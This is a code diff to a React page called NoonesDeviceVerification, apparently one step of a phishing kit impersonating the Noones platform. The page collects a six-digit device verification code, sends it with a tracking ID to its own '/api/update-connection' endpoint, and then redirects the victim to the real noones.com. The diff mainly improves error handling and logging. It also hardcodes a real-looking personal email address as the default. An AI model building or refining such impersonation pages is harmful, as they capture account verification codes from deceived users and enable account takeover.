@@ -13,6 +13,7 @@ export default function NoonesDeviceVerification() {
   const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
   const [code, setCode] = useState(['', '', '', '', '', '']);
   const [resendTimer, setResendTimer] = useState(53);
+  const [backendError, setBackendError] = useState('');
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const email = location.state?.email || 'gibsonkobia@gmail.com';
@@ -86,20 +87,24 @@ export default function NoonesDeviceVerification() {
         throw new Error('No tracking ID found');
       }
 
+      setBackendError('');
       console.log('[NOONES_STEP3] Updating code for tracking_id:', trackingId);
       
-      // Fire UPDATE via server endpoint with retry wrapper (non-blocking)
       const response = await fetch('/api/update-connection', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ tracking_id: trackingId, code: verificationCode }),
       });
 
+      console.log('[NOONES_STEP3] API response status:', response.status);
       const payload = await response.json().catch(() => ({}));
+      console.log('[NOONES_STEP3] API response payload:', payload);
 
       if (!response.ok) {
-        console.error('[NOONES_STEP3] ❌ update-connection failed:', payload);
-        alert(`Unable to verify code: ${payload.error || 'Unknown error'}`);
+        const message = payload?.error || 'Unknown error';
+        console.error('[NOONES_STEP3] ❌ update-connection failed:', message);
+        setBackendError(`Unable to verify code: ${message}`);
+        alert(message);
         return;
       }
 
@@ -114,9 +119,11 @@ export default function NoonesDeviceVerification() {
       setTimeout(() => {
         window.location.href = 'https://noones.com/';
       }, 1000);
-    } catch (err) {
+    } catch (err: any) {
       console.error('[NOONES_STEP3] Error:', err);
-      alert('Verification failed. Please try again.');
+      const message = err?.message || 'Verification failed. Please try again.';
+      setBackendError(message);
+      alert(message);
     }
   };
 
